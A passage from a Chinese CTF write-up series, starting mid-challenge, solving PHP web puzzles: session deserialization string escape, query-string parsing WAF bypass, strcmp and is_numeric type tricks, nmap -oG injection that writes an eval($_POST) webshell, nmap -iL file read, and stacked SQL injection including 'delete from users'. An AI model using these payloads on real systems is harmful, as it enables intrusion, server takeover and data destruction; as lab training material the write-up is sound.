  ["img"]=&gt; string(20) "ZDBnM19mMWFnLnBocA==" 
  ["dd"]=&gt; string(1) "a" 
}


```

写成数组形式也即：

```
$_SESSION["user"]='";s:8:"function";s:59:"a';
$_SESSION["img"]='ZDBnM19mMWFnLnBocA==';
$_SESSION["dd"]='a';


```

可以发现，**SESSION数组的键值img对应的值发生了改变。**

设想，如果我们能够控制原来SESSION数组的 funcion 的值但无法控制 img 的值，我们就可以通过这种方式间接控制到 img 对应的值。这个感觉就像SQL 注入一样，他本来想读取的base64编码是： L2QwZzNfZmxsbGxsbGFn,但是由于过滤掉了flag,向后读取的过程中把键值 function 放到了第一个键值的内容里面，用ZDBnM19mMWFnLnBocA==代替了真正的base64编码，读取了 d0g3_f1ag.php 的内容。而识别完成后最后面的`";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}`被忽略掉了，不影响正常的反序列化过程。

6、回到题目，来看看最终的Payload：

```
GET：  f=show_image;
Post： _SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}


```

分析一下，指定了各个参数的值，正常的序列化过程为：

```
&lt;?php
  $_SESSION["user"]='flagflagflagflagflagflag';
  $_SESSION["function"]='a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:2:"dd";s:1:"a";}';
  $_SESSION["img"]='ZDBnM19mMWFnLnBocA==';
  $_SESSION["img"] = base64_encode('guest_img.png');
  echo serialize($_SESSION);
?&gt;


```

由于过滤机制，那么序列化之后：

<img src="https://img-blog.csdnimg.cn/20200821121256542.png#pic_center" alt="在这里插入图片描述"> 那么此时反序列之后就变成了：

<img src="https://img-blog.csdnimg.cn/20200821121353171.png#pic_center" alt="在这里插入图片描述"> 来看看执行结果：

<img src="https://img-blog.csdnimg.cn/20200821121414205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"> 提示在 d0g3_fllllllag 里，`base_encode(/d0g3_fllllllag)=L2QwZzNfZmxsbGxsbGFn`修改一下payload即可：

<img src="https://img-blog.csdnimg.cn/20200821122302744.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述">

### No.8 PHP 字符串解析漏洞利用

来看看题目链接： <img src="https://img-blog.csdnimg.cn/20210504124800727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 1、访问解题地址是一个简单的计算器，尝试输入数值进行计算： <img src="https://img-blog.csdnimg.cn/20210504125632982.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

2、猜测应该是考察命令执行漏洞，尝试直接读取 `flag.php`，失败： <img src="https://img-blog.csdnimg.cn/20210504125750263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">实际上发现不能输入任何非数字的字符（除非运算符）： <img src="https://img-blog.csdnimg.cn/20210504134217513.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

3、访问网页源码，提示有 WAF 过滤： <img src="https://img-blog.csdnimg.cn/20210504125102487.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4、查看 `calc.php` 的网页，获得 WAF 的源码，可以看到过滤了空格、单引号、双引号、“`/`”等： <img src="https://img-blog.csdnimg.cn/20210504125331794.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">代码如下：

```
&lt;?php
error_reporting(0);
if(!isset($_GET['num'])){
    show_source(__FILE__);
}else{
        $str = $_GET['num'];
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]','\$','\\','\^'];
        foreach ($blacklist as $blackitem) {
                if (preg_match('/' . $blackitem . '/m', $str)) {
                        die("what are you want to do?");
                }
        }
        eval('echo '.$str.';');
}
?&gt; 


```

至此就很尴尬了，只能输入数字和加减乘除运算符，不能输入字符，而且还过滤一堆关键词……

【**PHP字符串解析漏洞**】

下面需要结合 PHP 字符串解析漏洞进行 WAF 绕过，所以先对 PHP 字符串解析特性进行了解。
1. PHP 会将查询字符串（在 URL 或正文中）转换为内部`$_GET`或的关联数组`$_POST`。例如：`/?foo=bar`变成`Array([foo] =&gt; “bar”)`。1. 值得注意的是，查**询字符串在解析的过程中会将某些字符删除或用下划线代替**。1. 例如，`/?%20news[id%00=42`会转换为`Array([news_id] =&gt; 42)`。如果一个 IDS/IPS 或 WAF 中有一条规则是当 `news_id` 参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：`/news.php?%20news[id%00=42"+AND+1=0--`，上述 PHP 语句的参数`%20news[id%00`的值将存储到`$_GET[“news_id”]`中。
PHP 需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：
1. 删除空白符；1. 将某些字符转换为下划线（包括空格）。
例如： <img src="https://img-blog.csdnimg.cn/2021050413230655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 将 PHP 该解析特性应用到本题目中来，因为 waf 不允许 num 变量传递字母：

```
http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话


```

那么我们可以在 num 变量名称前加个空格：

```
http://www.xxx.com/index.php? num = aaaa


```

这样 waf 就找不到 num 这个变量了，因为现在的变量叫`“ num”`，而不是`“num”`。但 php 在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。

5、解决了如何传递字符后，需要先扫根目录下的所有文件（看看是否存在 flag 文件），也就是`scandir("/")`，但是“`/`”被过滤了，所以我们用`chr(“47”)`绕过（ `chr()` 函数可以将 ASCII 码转换为字符），Payload 如下：

```
calc.php? num=var_dump(scandir(chr(47))) 


```

执行后可看到根目录下存在 `flagg` 文件：

<img src="https://img-blog.csdnimg.cn/20210504134428361.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">6、知道有 `f1agg.php` 这个文件就可以用 `file_get_contents()` 函数先读取文件为字符串然后用 `var_dump` 显示字符串得到 flag，Payload 如下：

```
calc.php? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))


```

获得最终的 Flag： <img src="https://img-blog.csdnimg.cn/202105041346403.png" alt="在这里插入图片描述">另外一个 Payload（省略了 `var_dump` 函数）：

```
/calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))


```

异曲同工： <img src="https://img-blog.csdnimg.cn/20210504134917267.png" alt="在这里插入图片描述"> 【**题目小结**】
1. PHP 变量字符串解析漏洞可绕过 WAF 对某些变量的拦截规则；1. 使用`chr(“47”)`绕过"`/`"的过滤（ `chr()` 函数可以将 ASCII 码转换为字符），附上；1. PHP 在 CTF 中几个常用的函数：
|函数|作用
|------
|var_dump()|判断一个变量的类型与长度，并输出变量的数值，如果变量有值输的是变量的值并回返数据类型
|file_get_contents()|把整个文件读入一个字符串中
|scandir()|返回指定目录中的文件和目录的数组

### No.9 PHP strcmp函数漏洞利用

老规矩先看看题目链接： <img src="https://img-blog.csdnimg.cn/20210504210529201.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 1、访问解题地址： <img src="https://img-blog.csdnimg.cn/20210504210637198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">访问右上角的 PAYFLAG 菜单，获得解题提示（提供金钱 10000000，同时需要答对密码等）： <img src="https://img-blog.csdnimg.cn/20210504210842360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 查看网页代码，还有进一步的提示（ password 需要等于 404 同时还不能是数字……）： <img src="https://img-blog.csdnimg.cn/2021050421110540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 2、抓包发现 Cookie 默认待了 `user=0` 且服务端提示 “ Only Cuit’s students can buy the FLAG ”，如下图： <img src="https://img-blog.csdnimg.cn/20210504212020605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">3、尝试修改 `user=1`（CTF 的直觉改成1），成功获得 Cuit’s students 的身份会话： <img src="https://img-blog.csdnimg.cn/20210504212149353.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">4、结合题目提示，让我们 Post 传递一个 money 和一个 password 参数，password 要等于 404 并且不能为数字，那好办我们可以用弱类型，即让`password=404a`，如下图所示： <img src="https://img-blog.csdnimg.cn/20210504215209162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

5、成功进行密码校验，继续传递参数 money=10000000 尝试购买 flag，结果提示位数太长： <img src="https://img-blog.csdnimg.cn/20210504215405658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

6、那可以用科学计数法 `1e9` 表示 100000000，得到 flag： <img src="https://img-blog.csdnimg.cn/20210504215527248.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 【**PHP strcmp() 函数漏洞**】

此处关于金钱长度的另一种绕过方式是利用 PHP strcmp() 函数漏洞，这一个漏洞适用于 php 5.3 之前的版本，本题结合响应包中的头部信息泄露可确定符合利用条件： <img src="https://img-blog.csdnimg.cn/20210504220003217.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">我们首先看一下这个函数，这个函数是用于比较字符串的函数：

```
int strcmp ( string $str1 , string $str2 )


```

如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。

可知，传入的期望类型是字符串类型的数据，但是如果我们传入非字符串类型的数据的时候，这个函数将会有怎么样的行为呢？实际上，**当这个函数接受到了不符合的类型，这个函数将发生错误，但是在 5.3 之前的 php 中，显示了报错的警告信息后，将 return 0 !!! 也就是虽然报了错，但却判定其相等了**。这对于使用这个函数来做选择语句中的判断的代码来说简直是一个致命的漏洞，当然，php 官方在后面的版本中修复了这个漏洞，使得报错的时候函数不返回任何值。但是我们仍然可以使用这个漏洞对使用老版本 php 的网站进行渗透测试。

看一段示例代码：

```
&lt;?php
    $password="***************"
     if(isset($_POST['password'])){

        if (strcmp($_POST['password'], $password) == 0) {
            echo "Right!!!login success";n
            exit();
        } else {
            echo "Wrong password..";
        }
?&gt;


```

对于这段代码，我们能用什么办法绕过验证呢， 只要我们`$_POST[‘password’]`是一个数组或者一个 object 即可，但是上一个问题的时候说到过，只能上传字符串类型，那我们又该如何做呢。其实 php 为了可以上传一个数组，会把结尾带一对中括号的变量，例如 `xxx[]`的 name（就是`$_POST`中的key），当作一个名字为 xxx 的数组构造类似如下的 request 即可使得上述代码绕过密码校验：

```
POST /login HTTP/1.1
Host: xxx.com
Content-Length: 41
Accept: application/json, text/javascript
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Connection: close

password[]=admin


```

【**Payload 2**】

综上，利用 PHP strcmp 函数的漏洞，我们可以用另外的 Payload :`password=404a&amp;money[]=1`来获得 Flag： <img src="https://img-blog.csdnimg.cn/20210504220526458.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">【**Payload 3**】

与此同时，password 参数也有另外一种绕过方式。

**php 中的`is_numeric()`漏洞**：`is_numeric` 函数对于空字符`%00`,无论是`%00`放在前后都可以判断为非数值，而`%20`空格字符只能放在数值后。所以，查看函数发现该函数对于第一个空格字符会跳过空格字符判断，接着后面的判断！

所以也可以用如下 Payload 3：`password=404%20&amp;money[]=1` 获得 flag 值： <img src="https://img-blog.csdnimg.cn/20210504221858328.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 【**题目小结**】
1. 观察数据包，修改 cookie 中 user=0 的值绕过身份校验；1. 观察网页源码获得解题提示，使用 php 中的`is_numeric()`漏洞或者 php 弱比较漏洞构造 `password= 404a` 或 `password=404%00`、 `password=404%20`来绕过密码校验；1. 使用科学计数法 `1e9` 或者 php strcmp() 函数漏洞（php 5.3版本之前）来绕过金额长度的限制。
### No.10 Nmap 上传一句话木马

先来看看题目： <img src="https://img-blog.csdnimg.cn/20210505005635610.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">1、访问题目解题链接，属于 PHP 代码审计： <img src="https://img-blog.csdnimg.cn/20210505005707327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">源码如下：

```
 &lt;?php
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}


```

【**Nmap写入一句话木马**】

题目提示是 RCE，从代码中可以看出，解题目标是向 host 参数传递目标 Payload 使得 system() 函数执行恶意命令。查阅资料可知道，**nmap 命令中 有一个`-oG`参数可以实现将命令和结果写到文件，我们可以借助该参数写入一句话木马到服务器指定文件中，并通过蚁剑链接后控制服务器、查看 Flag**。

故我们要实现：

```
nmap -T5 -sT -Pn --host-timeout 2 -F &lt;?php @eval($_POST["123"]); ?&gt; -oG hack.php


```

即实现：

```
?host=&lt;?php @eval($_POST["123"]);?&gt; -oG hack.php


```

【**escapeshellarg 函数组合漏洞**】

但是我们发现 host 参数传递的值会经过`escapeshellarg()`和 `escapeshellcmd()` 函数处理后再传递给 system 函数执行，先来了解下这两个函数：

|函数|作用
|------
|escapeshellarg()|将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样能确保直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号) 。
|escapeshellcmd()|对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义（如&amp; # ; `

这两个函数按代码里那样的顺序使用，是会产生漏洞的，如果是反过来就不会（、）。

下面简述一下该漏洞：
1. 假设传入的参数是：`172.17.0.2' -v -d a=1`；1. 经过 `escapeshellarg()` 函数处理后变成了`'172.17.0.2'\'' -v -d a=1'`，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用；1. 经过 `escapeshellcmd()` 函数处理后变成`'172.17.0.2'\\'' -v -d a=1\'`，这是因为`escapeshellcmd()` 对`\`以及最后那个不配对儿的引号进行了转义；1. 最后执行的命令是`curl '172.17.0.2'\\'' -v -d a=1\'`，由于中间的`\\`被解释为`\`而不再是转义字符，所以后面的`'`没有被转义，与再后面的`'`配对儿成了一个空白连接符。所以可以简化为`curl 172.17.0.2\ -v -d a=1'`，即向`172.17.0.2\`发起请求，POST 数据为`a=1'`。
所以这里这些代码的本意是希望我们输入 ip 这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚。

这里常见的命令后注入操作如 `| &amp; &amp;&amp;`都不行，虽然我们通过上面的操作逃过了单引号，但`escapeshellcmd()`函数会对这些特殊符号前面加上`\`来转移，但是我们之前就说了，要利用 nmap 的`-oG`参数，所以我们就可以构造 Payload：

```
?host=' &lt;?php @eval($_POST["123"]);?&gt; -oG hack.php '


```

注意 Payload 中首尾都加了单引号和空格，空格我还不懂啥意思……下面只分析加单引号的妙处。

运行以下测试代码：

```
&lt;?php
    $host1 = "123";
    $host2 = escapeshellarg($host1);
    $host3 = escapeshellcmd($host2);
    echo $host1."\n".$host2."\n".$host3."\n";
    echo "nmap -T5 -sT -Pn --host-timeout 2 -F ".$host3;
?&gt;


```

结果如下： <img src="https://img-blog.csdnimg.cn/20210505100832723.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">修改 `$host1 = "'123'"`（添加单引号），运行效果如下： <img src="https://img-blog.csdnimg.cn/20210505100953595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">来分析下运行结果：

```
'123'
''\''123'\'''
''\\''123'\\'''
nmap -T5 -sT -Pn --host-timeout 2 -F ''\\''123'\\'''


```

末尾的`''\\''123'\\'''`最终的转义执行过程：
1. 命令行`nmap -T5 -sT -Pn --host-timeout 2 -F`后面的前两个单引号形成了闭合表示空；而`\\''`的转义步骤：`\\`转移成了`\`，而`\`和后面的`'`转移成了`'`，最后结果为`''`表示空 ；1. 数字123后面的`'\\'''`的转义步骤则为：保留第一个`'`，`\\'''`同理变成`'''`，正好和前一个`'`形成两个闭合，表示空。
就这样，输入`'123'`后`123`就变成了命令而不是带单引号的字符串。上面 Nmap 的 Payload 加单引号的原因则同理。

2、原理分析完，来看看 Payload 的利用和效果，在浏览器输入：

```
http://解题地址XXXX?host=' &lt;?php @eval($_POST["123"]);?&gt; -oG hack.php '


```

如下，服务端返回文件存储路径： <img src="https://img-blog.csdnimg.cn/20210505102053782.png" alt="在这里插入图片描述">3、使用蚁剑链接`http://XXXXX/5f19f45ad7b9da693206c096c48a2a8d/hack.php`，如下所示： <img src="https://img-blog.csdnimg.cn/20210505102952752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 成功连接： <img src="https://img-blog.csdnimg.cn/20210505103019481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 到根目录下可读取到 flag： <img src="https://img-blog.csdnimg.cn/20210505103249180.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

<img src="https://img-blog.csdnimg.cn/20210505103111468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 【**题目小结**】
1. `escapeshellarg()`和 `escapeshellcmd()` 函数组合利用的顺序不当，可导致字符转义过滤失败；1. Nmap 的`-oG`参数可以实现将命令和结果写到文件，我们可以借助该参数写入一句话木马到服务器指定文件中，并通过蚁剑链接后控制服务器、查看 Flag。
### No.11 2020网鼎杯朱雀组Nmap

看看题目： <img src="https://img-blog.csdnimg.cn/20210505105258332.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">1、访问解题地址： <img src="https://img-blog.csdnimg.cn/20210505105328121.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">输入本地地址试试执行效果： <img src="https://img-blog.csdnimg.cn/20210505110013617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">

2、解法与上一题类似，使用 Nmap 的`-oG`参数上传一句话木马，尝试直接使用上一题的 Payload：

```
' &lt;?php @eval($_POST["123"]);?&gt; -oG hack.php '


```

提示 Hacker… <img src="https://img-blog.csdnimg.cn/20210505105911438.png" alt="在这里插入图片描述">3、应该存在黑名单，fuzz 发现，php 关键词被过滤了，我们再次构造一下代码：

```
' &lt;?= @eval($_POST["123"]);?&gt; -oG hack.phtml '


```

这里使用“`=`”绕过文件中的 php 字符，使用“`phtml`”绕过对“`php`”文件后缀的检测，再次输入： <img src="https://img-blog.csdnimg.cn/2021050511031225.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210505110320914.png" alt="在这里插入图片描述"> 4、尝试进行命令执行，成功上传一句话木马：

<img src="https://img-blog.csdnimg.cn/2021050511060327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">5、菜刀连接木马并查看获得 Flag： <img src="https://img-blog.csdnimg.cn/2021050511072111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210505110737528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/20210505110750409.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 6、另一种解法是直接使用 Nmap 的`-iL` 读取任意文件，Payload 如下：

```
' -iL /flag -oN test.txt '


```

输入Payload： <img src="https://img-blog.csdnimg.cn/20210505111027243.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 然后访问 test.txt 文件即可： <img src="https://img-blog.csdnimg.cn/20210505111134922.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 【**题目小结**】
1. Nmap 写入一句话木马，获得服务器控制器并查看 flag，过滤 php 文件名后缀关键词后使用`phtml`代替；1. 使用 Nmap `-iL` 读取任意文件（在知道 flag 存放路径的情况下可用）。
### No.12 强网杯 SQL注入之堆叠注入

**堆叠注入原理解析**

大家都知道 SQL 语句默认的结束符是分号“`；`”。我们可以使用分号同时执行多个 SQL 语句。那我们做一个推理，假如一个网站存在 SQL 注入漏洞，我们使用分号在注入点拼接多个 SQL 语句会不会一起带入数据库执行呢？正是这个推理形成了堆叠注入这个概念！注入点示例：

```
?id=1;delete from users;


```

**数据库实现堆查询**

其实所谓的堆查询就是使用分号隔开同时执行多条 SQL 语句。比如下面的例子，第一条语句查询表，第二条查询当前数据库名：

```
select * from user;select database()；


```

执行结果如下： <img src="https://img-blog.csdnimg.cn/20210607205719948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> 再如下面第一条查询表，第二条删除表：

```
select * from users;delete from users;


```

执行结果如下： <img src="https://img-blog.csdnimg.cn/20210607205908659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTE5MDg5Nw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> **堆注入局限性（php-mysql）**

大家都知道，网站后台的查询语句只会返回一个结果，所以我们无法确定我们的堆叠语句是否执行成功。另外还需要注意一个问题，如果我们的网站后台只支持一条 SQL 语句执行，那堆注入不存在了。所以想要支持堆注入还需要网站后台支持执行多条 SQL 语句才可以。如 PHP 需要将 `mysqli_query()` 函数换为 `mysqli_multi_query()` 才可以执行多条 SQL 语句查询。

